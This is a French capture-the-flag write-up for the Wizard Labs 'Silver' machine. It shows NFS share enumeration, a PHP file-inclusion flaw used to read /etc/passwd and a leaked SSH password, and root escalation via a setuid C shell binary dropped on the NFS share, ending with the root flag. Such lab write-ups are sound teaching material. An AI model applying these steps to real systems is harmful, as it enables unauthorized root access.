# Solution du CTF Silver de Wizard Labs

Bronze
------

*Silver* est un CTF de Wizard Labs annoncé avec une difficulté de 4/10.  

Premier élément qui fait tilter tout habitué des CTFs : la présence d'un partage NFS sur la machine :  

```plain
$ showmount -a 10.1.1.36
All mount points on 10.1.1.36:
10.28.12.6:/home/silver/nfs
```

On monte ce partage avec la commande *sudo mount 10.1.1.36:/home/silver/nfs /mnt/* mais il est vide.  

On se doute toutefois qu'on aura à y placer un binaire setuid plus tard :p   

Sur le site web de la box, [Wapiti](http://wapiti.sourceforge.net/) trouve différentes failles dans le paramètre *language* d'une même page (c'est la même faille mais découverte par trois biais différents) :  

* Divulgation de fichier si la valeur est */etc/passwd*
* Exécution de commande via un wrapper PHP (voir capture d'écran plus loin)
* Timeout si la valeur est *http://www.google.com/*

![Wizard Labs CTF Silver include() vulnerability Wapiti report](https://raw.githubusercontent.com/devl00p/blog/master/images/wizard-labs/silver_rce.png)

Autant dire qu'on a affaire à une faille d'inclusion PHP et que l'inclusion distante est activée.  

L'exploitation de cette vulnérabilité peut avoir bien des scénarios différents mais en fait si on lit */etc/passwd* on remarque une ligne explicite à la fin du fichier :  

> ssh password for silver: i'msilver

Gold
----

On obtient donc l'accès sur cette machine 32bits. On écrit le code suivant que l'on compilera avec *-m32* :  

```c
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void) {
        setreuid(0, 0);
        system("/bin/bash");
        return 0;
}
```

On le copie ensuite sur le partage NFS avec les droits root + setuid et c'est finit :  

```plain
silver@silver:~/nfs$ ls -l
total 652
-rwsr-xr-x 1 root root 664956 Feb 23 06:37 devloop
silver@silver:~/nfs$ ./devloop
root@silver:~/nfs# id
uid=0(root) gid=1000(silver) groups=1000(silver),4(adm),24(cdrom),30(dip),46(plugdev),109(lpadmin),125(sambashare)
root@silver:~/nfs# cd /root/
root@silver:/root# cat root.txt
3f3d93725cebd44cf7bb1fb327e8a0b1
```


*Published November 17 2020 at 14:08*